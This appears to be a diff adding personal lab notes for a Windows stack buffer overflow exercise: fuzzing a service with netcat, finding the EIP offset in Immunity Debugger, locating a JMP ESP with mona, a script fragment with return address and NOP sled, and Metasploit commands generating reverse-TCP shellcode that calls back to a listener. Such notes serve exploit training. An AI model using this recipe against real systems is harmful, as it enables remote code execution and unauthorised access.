@@ -1,0 +1,31 @@
+run the .exe on linux
+use tcpview/ netstat -anob to ID the open port on win box
+connect to port from linops
+nc TARGET PORT
+BUFF /.:/5000x value -> if the connection drops it was successful in breaking the buffer
+open the .exe from immunity debugger (important windows are CPU, memory map, log data, call tree) 
+build script on linux to run against .exe on netcat
+reference the EIP value on CPU field in immunity to 4141414141 (all AAAs) being writtin to the EIP)
+now edit the winexp.py script to buff += a 5000 char string from wiremask.eu.
+rewind immunity, run python again and look at unique EIP value and put into wiremask to determine memory offset for buffer exploit (1945)
+send a test string of BBBB as the EIP value in the .py. ENSURE TO CHANGE s.send TO (buff+EIP)
+use !mona modules in immunity to ID the .dll that is affecting the memory
+use !mona jmp -r esp -m "special.dll" -> this finds the memory location for the jump to set at the EIP value (in log data field)
+set the EIP and NOP values in script (change the s.send to include NOP as well)
+	buff = "BUFF /.:/"
+	buff += "A" * 1945 
+
+	EIP = "\x31\x14\x50\x62"
+
+	NOP = "\x90" * 10
+use metasploit to generate shell code
+msfconsole
+msf6 > use payload/windows/shell_reverse_tcp
+msf6 > set lhost 10.50.130.31 (listener which is acting ass the callback server LINOPS!!!)
+msf6 > set lport 4444
+msf6 > generate -b "\x00\x20\x0a\x0d\x03" -f python
+copy contents into script and add buf to the s.send addition line
+establish your listener 
+	nc -lvp 4444
+execute the script and the listener window should open a shell
+proxychains ./winbuffexp.py (YOU MUST ENSURE YOUR CURRENT DYNAMIC CAN REACH THE TARGET WINDOWS BOX)
